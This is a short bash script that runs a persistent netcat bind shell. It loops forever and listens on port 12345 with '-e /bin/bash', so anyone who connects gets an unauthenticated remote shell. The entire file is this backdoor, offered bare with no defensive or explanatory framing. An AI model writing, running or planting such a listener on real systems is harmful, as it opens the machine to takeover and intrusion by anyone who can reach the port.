#!/bin/bash

while true; do
    { coproc cat; } 2>/dev/null
    nc -l -p 12345 -k -e /bin/bash
done

